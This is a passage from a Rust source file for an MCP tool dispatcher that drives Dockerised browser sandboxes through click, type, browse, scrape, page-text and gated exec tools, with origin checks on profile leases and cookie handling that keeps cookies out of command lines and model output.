//! Shared MCP tool dispatcher used by both `serve` (SSE/HTTP) and `connect` (stdio).

#![allow(clippy::collapsible_if)]

use crate::docker::{
    AuthHandoffOptions, PageActionOptions, PageTextOptions, ProfileMount, Sandbox, novnc_url,
};
use crate::mcp::ToolResponse;
use crate::runtime::RuntimeClient;

pub struct ToolContext<'a> {
    pub runtime: &'a RuntimeClient,
    pub public_host: String,
    pub agent: Option<&'a crate::agent::AgentState>,
    pub profile_broker: Option<&'a crate::profile::ProfileBroker>,
    pub cookie_jars: Option<&'a crate::profile::CookieJarService>,
    pub owner: Option<String>,
}

pub fn resolve_owner(
    ctx: &ToolContext<'_>,
    args: &serde_json::Value,
    screen: u32,
) -> Option<String> {
    if let Some(owner) = &ctx.owner {
        if !owner.trim().is_empty() {
            return Some(owner.clone());
        }
    }
    if let Some(owner) = args.get("owner").and_then(|v| v.as_str()) {
        if !owner.trim().is_empty() {
            return Some(owner.to_string());
        }
    }
    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if let Some(owner) = info.owner {
                if !owner.trim().is_empty() {
                    return Some(owner);
                }
            }
        }
    }
    None
}

pub fn profile_lock_error_value(err: &crate::profile::ProfileLockError) -> serde_json::Value {
    match err {
        crate::profile::ProfileLockError::Locked { profile, holder } => {
            serde_json::json!({
                "error": "profile_locked",
                "profile": profile,
                "holder": holder,
            })
        }
        crate::profile::ProfileLockError::Timeout {
            profile,
            timeout_ms,
            holder,
        } => serde_json::json!({
            "error": "profile_lock_timeout",
            "profile": profile,
            "timeout_ms": timeout_ms,
            "holder": holder,
        }),
        crate::profile::ProfileLockError::Io { profile, source } => {
            serde_json::json!({
                "error": "profile_lock_io_error",
                "profile": profile,
                "message": source.to_string(),
            })
        }
    }
}

pub fn acquire_tool_profile_lease(
    ctx: &ToolContext<'_>,
    tool: &str,
    args: &serde_json::Value,
    screen: u32,
) -> Result<Option<crate::profile::ProfileLease>, ToolResponse> {
    if tool != "browse" && tool != "page_text" {
        return Ok(None);
    }

    if let Some(broker) = ctx.profile_broker {
        let (profile_name, _) = match profile_for_tool(ctx, args, screen) {
            Ok(profile) => profile,
            Err(error) => return Err(ToolResponse::error(error)),
        };
        let timeout_ms = args.get("timeout_ms").and_then(|v| v.as_u64()).unwrap_or(0);
        let owner = resolve_owner(ctx, args, screen);
        let holder =
            crate::profile::LockHolderInfo::new(Some(screen), Some(tool.to_string()), owner);
        match broker.acquire_with_holder(&profile_name, timeout_ms, Some(holder)) {
            Ok(lease) => Ok(Some(lease)),
            Err(e) => {
                let err_val = profile_lock_error_value(&e);
                Err(ToolResponse::error(
                    serde_json::to_string(&err_val).unwrap_or_else(|_| e.to_string()),
                ))
            }
        }
    } else {
        Ok(None)
    }
}

/// Resolve the noVNC URL for a sandbox using the configured public host.
pub fn novnc_url_for(ctx: &ToolContext<'_>, sandbox: &Sandbox) -> String {
    novnc_url_for_screen(ctx, sandbox, 0)
}

pub fn novnc_url_for_screen(ctx: &ToolContext<'_>, sandbox: &Sandbox, screen: u32) -> String {
    let port = sandbox.ports.novnc.unwrap_or(6080) + screen as u16;
    novnc_url(&ctx.public_host, port)
}

pub fn screen_for(args: &serde_json::Value) -> u32 {
    args.get("screen").and_then(|v| v.as_u64()).unwrap_or(0) as u32
}

pub fn display_for(screen: u32) -> String {
    format!(":{}", 99 + screen)
}

fn is_safe_key_combo(combo: &str) -> bool {
    !combo.is_empty()
        && combo
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '_' | '-' | '[' | ']' | ':'))
}

/// Validate the `screen` argument for tools.
pub fn requested_screen(args: &serde_json::Value) -> Result<u32, String> {
    Ok(screen_for(args))
}
/// Build the identity used for ref lookup. The Docker incarnation is authoritative; target
/// names are intentionally not part of the key.
async fn current_ref_scope(
    ctx: &ToolContext<'_>,
    target: &str,
    screen: u32,
) -> Result<crate::refs::RefScope, ToolResponse> {
    let incarnation = ctx
        .runtime
        .incarnation(target)
        .await
        .map_err(|_| ToolResponse::error("computer_unavailable"))?;
    let (attempt_id, handoff_gen, observation_gen) = ctx
        .agent
        .and_then(|agent| agent.screen_info(screen))
        .map(|info| {
            (
                info.grant.as_ref().map(|grant| grant.attempt_id.clone()),
                Some(info.handoff_gen),
                Some(info.observation_gen),
            )
        })
        .unwrap_or((None, None, None));
    Ok(
        crate::refs::RefScope::new(incarnation, screen, attempt_id, handoff_gen)
            .with_observation_gen(observation_gen),
    )
}

/// Leased screens always observe through their granted profile, including current-page
/// observations (where no URL is supplied). This prevents an implicit screen profile from
/// crossing account leases.
fn profile_for_tool(
    ctx: &ToolContext<'_>,
    args: &serde_json::Value,
    screen: u32,
) -> Result<(String, bool), String> {
    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if let Some(grant) = info.grant {
                for key in ["use_profile", "profile"] {
                    if let Some(requested) = args.get(key).and_then(|value| value.as_str()) {
                        if requested != grant.profile {
                            return Err("profile is outside this lease grant".into());
                        }
                    }
                }
                let ephemeral = grant.profile.starts_with("/tmp/ctx-");
                return Ok((grant.profile, ephemeral));
            }
        }
    }

    Ok(resolve_profile_name(args, screen))
}
fn allowed_origins_for(ctx: &ToolContext<'_>, screen: u32) -> Option<Vec<String>> {
    ctx.agent
        .and_then(|agent| agent.screen_info(screen))
        .and_then(|info| info.grant)
        .filter(|grant| grant.account.is_some())
        .map(|grant| grant.origins.into_iter().collect())
}

fn validate_page_text_origin(
    ctx: &ToolContext<'_>,
    screen: u32,
    output: &crate::docker::PageTextOutput,
) -> Result<(), ToolResponse> {
    let Some(agent) = ctx.agent else {
        return Ok(());
    };
    let Some(info) = agent.screen_info(screen) else {
        return Ok(());
    };
    let Some(grant) = info.grant else {
        return Ok(());
    };
    if grant.account.is_some()
        && !output
            .url
            .as_deref()
            .is_some_and(|url| grant.permits_origin(url))
    {
        return Err(ToolResponse::error(
            "browser origin is outside this lease's allowed origins",
        ));
    }
    Ok(())
}

pub fn parse_jars(args: &serde_json::Value) -> Vec<String> {
    if let Some(arr) = args.get("jars").and_then(|v| v.as_array()) {
        arr.iter()
            .filter_map(|v| v.as_str().map(|s| s.trim().to_string()))
            .filter(|s| !s.is_empty())
            .collect()
    } else if let Some(s) = args.get("jars").and_then(|v| v.as_str()) {
        s.split(',')
            .map(|p| p.trim().to_string())
            .filter(|p| !p.is_empty())
            .collect()
    } else {
        vec![]
    }
}

struct MutationGuard<'a> {
    agent: Option<&'a crate::agent::AgentState>,
    incarnation: Option<String>,
    screen: u32,
}

impl Drop for MutationGuard<'_> {
    fn drop(&mut self) {
        if let Some(incarnation) = &self.incarnation {
            crate::refs::global_ref_table().clear_screen(incarnation, self.screen);
        }
        if let Some(agent) = self.agent {
            agent.invalidate_observation(self.screen);
        }
    }
}

async fn begin_mutation<'a>(
    ctx: &'a ToolContext<'a>,
    target: &str,
    screen: u32,
) -> MutationGuard<'a> {
    MutationGuard {
        agent: ctx.agent,
        incarnation: ctx.runtime.incarnation(target).await.ok(),
        screen,
    }
}

pub fn resolve_profile_name(args: &serde_json::Value, screen: u32) -> (String, bool) {
    let explicit_ephemeral = args
        .get("ephemeral")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let explicit_profile = args
        .get("use_profile")
        .or_else(|| args.get("profile"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    if explicit_ephemeral {
        (format!("/tmp/ctx-{}", uuid::Uuid::new_v4()), true)
    } else if let Some(p) = explicit_profile {
        let is_ephemeral = p.starts_with("/tmp/ctx-");
        (p, is_ephemeral)
    } else if args.get("jars").is_some() {
        // Jars declared without explicit profile name: launch ephemeral browser context
        (format!("/tmp/ctx-{}", uuid::Uuid::new_v4()), true)
    } else {
        (format!("screen-{screen}"), false)
    }
}

const BROWSE_SCRIPT: &str = concat!(
    include_str!("../assets/browser_page.py"),
    r#"
import json, os, subprocess, sys, time, urllib.request

def navigate():
    payload = json.load(sys.stdin)
    profile = payload['profile']
    port = payload.get('port') or 9222
    url = payload.get('url', 'about:blank')
    display = payload.get('display', ':99')
    os.environ['DISPLAY'] = display
    endpoint = 'http://127.0.0.1:%d' % port
    try:
        with urllib.request.urlopen(endpoint + '/json/version', timeout=1) as response:
            json.load(response)
    except (OSError, ValueError):
        args = ['reach-chrome', '--no-sandbox', '--disable-gpu', '--no-first-run',
                '--enable-automation', '--user-data-dir=' + profile,
                '--remote-debugging-port=' + str(port), '--', 'about:blank']
        subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         start_new_session=True)

    from playwright.sync_api import sync_playwright, Error
    with sync_playwright() as playwright:
        # CDP metadata can be ready while cold profile startup still blocks protocol commands.
        deadline = time.monotonic() + 60
        while True:
            try:
                browser = playwright.chromium.connect_over_cdp(endpoint, timeout=max(1, int((deadline - time.monotonic()) * 1000)))
                break
            except Error:
                if time.monotonic() >= deadline:
                    raise
                time.sleep(0.1)
        verify_cdp_profile(browser, profile)
        contexts = list(browser.contexts)
        if len(contexts) != 1:
            raise RuntimeError('expected exactly one browser context')
        # A browse request owns a new target rather than guessing among restored tabs.
        page = contexts[0].new_page()
        hydration = json.loads(payload.get('hydration_json') or '{}')
        cookies = hydration.get('cookies', [])
        if cookies:
            page.context.add_cookies(cookies)
        navigation_guard = NavigationGuard(page, payload.get('allowed_origins'))
        try:
            # Only this call navigates: launching Chrome must not submit the URL twice.
            page.goto(url, timeout=30000, wait_until='domcontentloaded')
            navigation_guard.check()
            page.bring_to_front()
            if not _isolated_document_has_focus(page):
                raise RuntimeError('navigation target is not focused')
        finally:
            navigation_guard.close()
        print('ok')

try:
    navigate()
except Exception:
    print('browser navigation outcome requires reconciliation', file=sys.stderr)
    sys.exit(1)
"#
);

/// Return a fixed Python command plus a JSON stdin payload. Cookie data is never present in
/// argv/environment; only the fixed helper source appears in argv.
pub fn browse_command_input(
    url: &str,
    profile_dir: &str,
    hydrated_json: Option<&str>,
    cdp_port: Option<u16>,
    display: &str,
    allowed_origins: Option<&[String]>,
) -> (Vec<String>, Vec<u8>) {
    let payload = serde_json::json!({
        "profile": profile_dir,
        "port": cdp_port,
        "url": url,
        "hydration_json": hydrated_json.unwrap_or(""),
        "display": display,
        "allowed_origins": allowed_origins,
    });
    (
        vec!["python3".into(), "-c".into(), BROWSE_SCRIPT.into()],
        serde_json::to_vec(&payload).expect("browse payload serializes"),
    )
}

pub const SCRAPE_SCRIPT: &str = r#"
import json
import os

payload = json.loads(os.environ.get("REACH_SCRAPE_PAYLOAD", "{}"))
url = payload.get("url", "")
selector = payload.get("selector", "body")
stealth = payload.get("stealth", True)

from scrapling import Fetcher, StealthyFetcher
cls = StealthyFetcher if stealth else Fetcher
r = cls().get(url)
elems = r.css(selector)
print(json.dumps([{'content': e.text, 'tag': e.tag} for e in elems]))
"#;

pub fn build_scrape_command(screen: u32, payload_json: &str) -> String {
    let display = display_for(screen);
    format!(
        "DISPLAY={display} REACH_SCRAPE_PAYLOAD={} python3 -c {}",
        crate::docker::shell_single_quote(payload_json),
        crate::docker::shell_single_quote(SCRAPE_SCRIPT),
    )
}

/// Model-facing sanitized and token-compact representation of `page_text` output.
///
/// Strips sensitive browser `cookies` (P0 security) and drops the raw `refs`
/// dictionary (which can span thousands of tokens). Interactive element tags
/// like `[@e1: link "Title" ...]` remain inline in `axtree`, and their coordinates
/// are stored in `GLOBAL_REF_TABLE` for backend resolution on `click`/`type`.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
pub struct PageTextModelResponse {
    pub status: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub query: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub matches_count: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub elements_count: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub axtree: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub text: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub help: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub truncated: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

/// Format and sanitize raw `PageTextOutput` for model consumption according to AXI standards.
pub fn format_page_text_response(
    out: crate::docker::PageTextOutput,
    requested_format: &str,
    view_mode: &str,
    max_lines: usize,
    query: Option<&str>,
) -> PageTextModelResponse {
    let elements_count = out.refs.as_ref().map(|r| r.len());
    let is_full = view_mode.eq_ignore_ascii_case("full");
    let mut any_truncated = false;
    let query_clean = query.and_then(|q| {
        let trimmed = q.trim();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    });

    let (axtree, query_matches_axtree) = match requested_format {
        "text" => (None, None),
        _ => {
            if let Some(tree) = out.axtree {
                let lines: Vec<&str> = tree.lines().collect();
                let (filtered_lines, match_count) = if let Some(q) = query_clean {
                    let terms: Vec<String> =
                        q.split_whitespace().map(|t| t.to_lowercase()).collect();
                    let matches: Vec<&str> = lines
                        .iter()
                        .copied()
                        .filter(|line| {
                            let lower = line.to_lowercase();
                            terms.iter().any(|t| lower.contains(t))
                        })
                        .collect();
                    let count = matches.len();
                    (matches, Some(count))
                } else {
                    (lines, None)
                };

                if !is_full && filtered_lines.len() > max_lines {
                    let preview = filtered_lines[..max_lines].join("\n");
                    any_truncated = true;
                    (
                        Some(format!(
                            "{}\n... [truncated {} lines ({} total). Pass view=\"full\" or a CSS `selector` to narrow]",
                            preview,
                            filtered_lines.len() - max_lines,
                            filtered_lines.len()
                        )),
                        match_count,
                    )
                } else if filtered_lines.is_empty() && query_clean.is_some() {
                    (
                        Some(format!(
                            "... [0 matching elements found for query \"{}\"]",
                            query_clean.unwrap()
                        )),
                        match_count,
                    )
                } else {
                    (Some(filtered_lines.join("\n")), match_count)
                }
            } else {
                (None, None)
            }
        }
    };

    let text = match requested_format {
        "axtree" => None,
        _ => {
            if let Some(txt) = out.text {
                let lines: Vec<&str> = txt.lines().collect();
                let filtered_lines: Vec<&str> = if let Some(q) = query_clean {
                    let terms: Vec<String> =
                        q.split_whitespace().map(|t| t.to_lowercase()).collect();
                    lines
                        .into_iter()
                        .filter(|line| {
                            let lower = line.to_lowercase();
                            terms.iter().any(|t| lower.contains(t))
                        })
                        .collect()
                } else {
                    lines
                };

                if !is_full && filtered_lines.len() > max_lines {
                    let preview = filtered_lines[..max_lines].join("\n");
                    any_truncated = true;
                    Some(format!(
                        "{}\n... [truncated {} lines ({} total). Pass view=\"full\" or a CSS `selector` to narrow]",
                        preview,
                        filtered_lines.len() - max_lines,
                        filtered_lines.len()
                    ))
                } else {
                    Some(filtered_lines.join("\n"))
                }
            } else {
                None
            }
        }
    };

    // Extract deterministic help hints based on visible element refs
    let mut help_hints = Vec::new();
    if let Some(ref tree_content) = axtree {
        let mut refs_found = Vec::new();
        for word in tree_content.split_whitespace() {
            if let Some(pos) = word.find("@e") {
                let clean: String = word[pos..]
                    .chars()
                    .take_while(|c| c.is_ascii_alphanumeric() || *c == '@')
                    .collect();
                if clean.len() >= 3 && !refs_found.contains(&clean) {
                    refs_found.push(clean);
                    if refs_found.len() >= 2 {
                        break;
                    }
                }
            }
        }
        if !refs_found.is_empty() {
            help_hints.push(format!("Run click(ref=\"{}\")", refs_found[0]));
            if refs_found.len() > 1 {
                help_hints.push(format!(
                    "Run type(ref=\"{}\", text=\"...\", submit=true)",
                    refs_found[1]
                ));
            }
        }
    }

    PageTextModelResponse {
        status: out.status,
        url: out.url,
        title: out.title,
        query: query_clean.map(|s| s.to_string()),
        matches_count: query_matches_axtree,
        elements_count,
        axtree,
        text,
        help: if !help_hints.is_empty() {
            Some(help_hints)
        } else {
            None
        },
        truncated: if any_truncated { Some(true) } else { None },
        message: out.message,
    }
}

/// Returns whether a tool performs active work on a screen.
pub fn is_active_tool(tool: &str) -> bool {
    matches!(
        tool,
        "click"
            | "type"
            | "key"
            | "browse"
            | "scrape"
            | "page_text"
            | "auth_handoff"
            | "playwright_eval"
            | "exec"
    )
}

pub async fn dispatch(
    ctx: &ToolContext<'_>,
    tool: &str,
    args: &serde_json::Value,
    target: &str,
) -> ToolResponse {
    let screen = screen_for(args);
    let display = display_for(screen);
    let _profile_lease = match acquire_tool_profile_lease(ctx, tool, args, screen) {
        Ok(l) => l,
        Err(err_resp) => return err_resp,
    };
    let requested_target = target;
    let sandbox = match ctx.runtime.find(target).await {
        Ok(sandbox) => sandbox,
        Err(e) => {
            return ToolResponse::error(format!("failed to inspect sandbox '{target}': {e}"));
        }
    };
    let target = sandbox.container_id.as_str();
    if matches!(tool, "exec" | "playwright_eval") && !sandbox.allow_exec {
        return ToolResponse::error(format!(
            "{tool} capability denied: sandbox '{requested_target}' was created without --allow-exec"
        ));
    }

    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if info.phase != crate::agent::ScreenPhase::AgentActive
                && info.phase != crate::agent::ScreenPhase::Idle
            {
                return ToolResponse::error(format!(
                    "takeover is active on screen {screen} (phase: {:?}, handoff_gen: {})",
                    info.phase, info.handoff_gen
                ));
            }
        }
    }

    let _busy_guard = if is_active_tool(tool) {
        ctx.agent.map(|a| a.mark_busy(screen))
    } else {
        None
    };

    let resp = match tool {
        "screenshot" => match ctx.runtime.screenshot(target, &display).await {
            Ok(bytes) => {
                if let Ok(incarnation) = ctx.runtime.incarnation(target).await {
                    crate::refs::global_ref_table().clear_screen(&incarnation, screen);
                }
                if let Some(agent) = ctx.agent {
                    agent.record_observation(screen);
                }
                use base64::Engine;
                ToolResponse::image(
                    base64::engine::general_purpose::STANDARD.encode(&bytes),
                    "image/png",
                )
            }
            Err(e) => ToolResponse::error(e.to_string()),
        },
        "click" => {
            let button = match args.get("button").and_then(|v| v.as_str()) {
                Some("right") => "right",
                Some("middle") => "middle",
                _ => "left",
            };
            if let Some(ref_str) = args.get("ref").and_then(|v| v.as_str()) {
                let scope = match current_ref_scope(ctx, target, screen).await {
                    Ok(scope) => scope,
                    Err(error) => return error,
                };
                let element = match crate::refs::resolve_ref(&scope, ref_str) {
                    Some(element) => element,
                    None => {
                        return ToolResponse::error(format!(
                            "ref '{ref_str}' not found on screen {screen}. Call page_text first to refresh refs."
                        ));
                    }
                };
                let selector = match element.selector {
                    Some(selector) if !selector.is_empty() => selector,
                    _ => return ToolResponse::error("ref has no live DOM selector"),
                };
                let identity = match crate::refs::global_ref_table().page_identity(&scope) {
                    Some(identity) if identity.loader_id.is_some() => identity,
                    _ => {
                        return ToolResponse::error("ref snapshot has no native document identity");
                    }
                };
                let backend_node_id = match element.backend_node_id {
                    Some(id) if id > 0 => id,
                    _ => return ToolResponse::error("ref has no native node identity"),
                };
                let _mutation_guard = begin_mutation(ctx, target, screen).await;
                let (profile_name, is_ephemeral) = match profile_for_tool(ctx, args, screen) {
                    Ok(profile) => profile,
                    Err(error) => return ToolResponse::error(error),
                };
                let user_data_dir = if is_ephemeral {
                    profile_name
                } else {
                    ProfileMount::container_path_for(&profile_name)
                };
                let timeout_ms = args
                    .get("timeout_ms")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(15_000);
                let opts = PageActionOptions {
                    target_id: identity.target_id,
                    loader_id: identity.loader_id.expect("checked above"),
                    selector,
                    backend_node_id,
                    action: "click".into(),
                    button: button.into(),
                    text: String::new(),
                    clear: false,
                    submit: false,
                    timeout_ms,
                    user_data_dir,
                    display: display.clone(),
                    screen,
                };
                return match ctx.runtime.page_action(target, &opts).await {
                    Ok(result) => ToolResponse::text(result),
                    Err(error) => ToolResponse::error(error.to_string()),
                };
            }
            let _mutation_guard = begin_mutation(ctx, target, screen).await;
            let button_num = match button {
                "right" => "3",
                "middle" => "2",
                _ => "1",
            };
            let x = args.get("x").and_then(|v| v.as_i64()).unwrap_or(0);
            let y = args.get("y").and_then(|v| v.as_i64()).unwrap_or(0);
            sh(
                ctx,
                target,
                screen,
                &format!("xdotool mousemove {x} {y} click {button_num}"),
            )
            .await
        }
        "type" => {
            let text = args.get("text").and_then(|v| v.as_str()).unwrap_or("");
            let reference = args.get("ref").and_then(|v| v.as_str());
            let clear = args.get("clear").and_then(|v| v.as_bool()).unwrap_or(false);
            let submit = args
                .get("submit")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if let Some(ref_str) = reference {
                let scope = match current_ref_scope(ctx, target, screen).await {
                    Ok(scope) => scope,
                    Err(error) => return error,
                };
                let element = match crate::refs::resolve_ref(&scope, ref_str) {
                    Some(element) => element,
                    None => {
                        return ToolResponse::error(format!(
                            "ref '{ref_str}' not found on screen {screen}. Call page_text first to refresh refs."
                        ));
                    }
                };
                let selector = match element.selector {
                    Some(selector) if !selector.is_empty() => selector,
                    _ => return ToolResponse::error("ref has no live DOM selector"),
                };
                let identity = match crate::refs::global_ref_table().page_identity(&scope) {
                    Some(identity) if identity.loader_id.is_some() => identity,
                    _ => {
                        return ToolResponse::error("ref snapshot has no native document identity");
                    }
                };
                let backend_node_id = match element.backend_node_id {
                    Some(id) if id > 0 => id,
                    _ => return ToolResponse::error("ref has no native node identity"),
                };
                let _mutation_guard = begin_mutation(ctx, target, screen).await;
                let (profile_name, is_ephemeral) = match profile_for_tool(ctx, args, screen) {
                    Ok(profile) => profile,
                    Err(error) => return ToolResponse::error(error),
                };
                let user_data_dir = if is_ephemeral {
                    profile_name
                } else {
                    ProfileMount::container_path_for(&profile_name)
                };
                let timeout_ms = args
                    .get("timeout_ms")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(15_000);
                let opts = PageActionOptions {
                    target_id: identity.target_id,
                    loader_id: identity.loader_id.expect("checked above"),
                    selector,
                    backend_node_id,
                    action: "type".into(),
                    button: "left".into(),
                    text: text.to_string(),
                    clear,
                    submit,
                    timeout_ms,
                    user_data_dir,
                    display: display.clone(),
                    screen,
                };
                return match ctx.runtime.page_action(target, &opts).await {
                    Ok(result) => ToolResponse::text(result),
                    Err(error) => ToolResponse::error(error.to_string()),
                };
            } else {
                let mut script = String::new();
                if clear {
                    script.push_str("xdotool key ctrl+a BackSpace && ");
                }
                script.push_str(&format!(
                    "xdotool type -- '{}'",
                    text.replace('\'', "'\\''")
                ));
                if submit {
                    script.push_str(" && xdotool key Return");
                }
                let _mutation_guard = begin_mutation(ctx, target, screen).await;
                sh(ctx, target, screen, &script).await
            }
        }
        "key" => {
            let combo = args
                .get("combo")
                .and_then(|v| v.as_str())
                .unwrap_or("Return");
            if !is_safe_key_combo(combo) {
                return ToolResponse::error(format!(
                    "invalid or unsafe key combo: '{combo}'. Must only contain alphanumeric characters, '+', '_', '-', ':', and brackets"
                ));
            }
            let _mutation_guard = begin_mutation(ctx, target, screen).await;
            sh(ctx, target, screen, &format!("xdotool key {combo}")).await
        }
        "browse" => {
            let url = args
                .get("url")
                .and_then(|v| v.as_str())
                .unwrap_or("about:blank");
            let snapshot = args
                .get("snapshot")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let (profile_name, is_ephemeral) = match profile_for_tool(ctx, args, screen) {
                Ok(profile) => profile,
                Err(error) => return ToolResponse::error(error),
            };
            let profile_dir = if is_ephemeral {
                profile_name.clone()
            } else {
                ProfileMount::container_path_for(&profile_name)
            };

            let declared_jars = parse_jars(args);
            let hydrated_json = if !declared_jars.is_empty() {
                ctx.cookie_jars.and_then(|jars_svc| {
                    serde_json::to_string(&jars_svc.hydrate_jars(&declared_jars)).ok()
                })
            } else {
                None
            };

            let cdp_port = 9222 + screen as u16;
            let allowed_origins = allowed_origins_for(ctx, screen);
            let (command, payload) = browse_command_input(
                url,
                &profile_dir,
                hydrated_json.as_deref(),
                Some(cdp_port),
                &display,
                allowed_origins.as_deref(),
            );
            let sh_resp = match ctx.runtime.exec_input(target, &command, &payload).await {
                Ok(out) if out.exit_code == 0 => ToolResponse::text(if out.stdout.is_empty() {
                    "ok".into()
                } else {
                    out.stdout
                }),
                Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
                Err(error) => ToolResponse::error(error.to_string()),
            };
            if sh_resp.is_error || !snapshot {
                return sh_resp;
            }

            // Inline snapshot requested: wait briefly and extract compact AXTree
            let query = args.get("query").and_then(|v| v.as_str());
            let requested_format = args
                .get("format")
                .and_then(|v| v.as_str())
                .unwrap_or("axtree");
            let view_mode = args
                .get("view")
                .and_then(|v| v.as_str())
                .unwrap_or("compact");
            let max_lines = args
                .get("max_lines")
                .and_then(|v| v.as_u64())
                .map(|n| n as usize)
                .unwrap_or(200);
            let opts = PageTextOptions {
                url: url.to_string(),
                wait_for: args
                    .get("wait_for")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                selector: args
                    .get("selector")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                format: Some(requested_format.to_string()),
                timeout_ms: args
                    .get("timeout_ms")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(15_000),
                user_data_dir: Some(profile_dir),
                display: Some(display.clone()),
                hydrated_cookies: None,
                allowed_origins,
            };
            match ctx.runtime.page_text(target, &opts).await {
                Ok(mut out) => {
                    if let Err(error) = validate_page_text_origin(ctx, screen, &out) {
                        return error;
                    }
                    if let Some(agent) = ctx.agent {
                        agent.record_observation(screen);
                    }
                    let ref_scope = match current_ref_scope(ctx, target, screen).await {
                        Ok(scope) => scope,
                        Err(error) => return error,
                    };
                    let raw_refs = out.refs.take().unwrap_or_default();
                    let snapshot =
                        crate::refs::global_ref_table().set_refs(ref_scope.clone(), raw_refs);
                    crate::refs::global_ref_table().set_page_identity(
                        ref_scope.clone(),
                        out.page_target_id.clone(),
                        out.page_loader_id.clone(),
                    );
                    crate::refs::save_refs_to_disk(&ref_scope, &snapshot.refs);
                    out.refs = Some(snapshot.refs);
                    out.axtree = out
                        .axtree
                        .take()
                        .map(|tree| crate::refs::rewrite_axtree(&tree, &snapshot.token_map));
                    let resp = format_page_text_response(
                        out,
                        requested_format,
                        view_mode,
                        max_lines,
                        query,
                    );
                    match serde_json::to_string_pretty(&resp) {
                        Ok(s) => ToolResponse::text(s),
                        Err(_) => sh_resp,
                    }
                }
                Err(error) => ToolResponse::error(error.to_string()),
            }
        }
        "scrape" => {
            let url = args.get("url").and_then(|v| v.as_str()).unwrap_or("");
            let sel = args
                .get("selector")
                .and_then(|v| v.as_str())
                .unwrap_or("body");
            let stealth = args
                .get("stealth")
                .and_then(|v| v.as_bool())
                .unwrap_or(true);
            let payload = serde_json::json!({
                "url": url,
                "selector": sel,
                "stealth": stealth,
            });
            let payload_str = match serde_json::to_string(&payload) {
                Ok(s) => s,
                Err(e) => return ToolResponse::error(e.to_string()),
            };
            let cmd = build_scrape_command(screen, &payload_str);
            match ctx
                .runtime
                .exec(target, &["bash".into(), "-c".into(), cmd])
                .await
            {
                Ok(out) if out.exit_code == 0 => ToolResponse::text(out.stdout),
                Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
                Err(e) => ToolResponse::error(e.to_string()),
            }
        }
        "playwright_eval" => {
            let script = args.get("script").and_then(|v| v.as_str()).unwrap_or("");
            py(ctx, target, screen, script).await
        }
        "exec" => {
            let cmd = args
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("echo");
            sh(ctx, target, screen, cmd).await
        }
        "page_text" => {
            let url = args
                .get("url")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let (profile_name, is_ephemeral) = match profile_for_tool(ctx, args, screen) {
                Ok(profile) => profile,
                Err(error) => return ToolResponse::error(error),
            };
            let user_data_dir = if is_ephemeral {
                profile_name.clone()
            } else {
                ProfileMount::container_path_for(&profile_name)
            };

            let declared_jars = if url.is_empty() {
                Vec::new()
            } else {
                parse_jars(args)
            };
            let hydrated_cookies = if !declared_jars.is_empty() {
                ctx.cookie_jars
                    .map(|svc| svc.hydrate_jars(&declared_jars).cookies)
            } else {
                None
            };

            let requested_format = args
                .get("format")
                .and_then(|v| v.as_str())
                .unwrap_or("both");

            let view_mode = args
                .get("view")
                .and_then(|v| v.as_str())
                .unwrap_or("compact");

            let max_lines = args
                .get("max_lines")
                .and_then(|v| v.as_u64())
                .map(|n| n as usize)
                .unwrap_or(200);

            let query = args.get("query").and_then(|v| v.as_str());

            let opts = PageTextOptions {
                url,
                wait_for: args
                    .get("wait_for")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                selector: args
                    .get("selector")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                format: Some(requested_format.to_string()),
                timeout_ms: args
                    .get("timeout_ms")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(30_000),
                user_data_dir: Some(user_data_dir),
                display: Some(display.clone()),
                hydrated_cookies,
                allowed_origins: allowed_origins_for(ctx, screen),
            };
            match ctx.runtime.page_text(target, &opts).await {
                Ok(mut out) => {
                    if let Err(error) = validate_page_text_origin(ctx, screen, &out) {
                        return error;
                    }
                    if let Some(agent) = ctx.agent {
                        agent.record_observation(screen);
                    }
                    let ref_scope = match current_ref_scope(ctx, target, screen).await {
                        Ok(scope) => scope,
                        Err(error) => return error,
                    };
                    let raw_refs = out.refs.take().unwrap_or_default();
                    let snapshot =
                        crate::refs::global_ref_table().set_refs(ref_scope.clone(), raw_refs);
                    crate::refs::global_ref_table().set_page_identity(
                        ref_scope.clone(),
                        out.page_target_id.clone(),
                        out.page_loader_id.clone(),
                    );
                    crate::refs::save_refs_to_disk(&ref_scope, &snapshot.refs);
                    out.refs = Some(snapshot.refs);
                    out.axtree = out
                        .axtree
                        .take()
                        .map(|tree| crate::refs::rewrite_axtree(&tree, &snapshot.token_map));
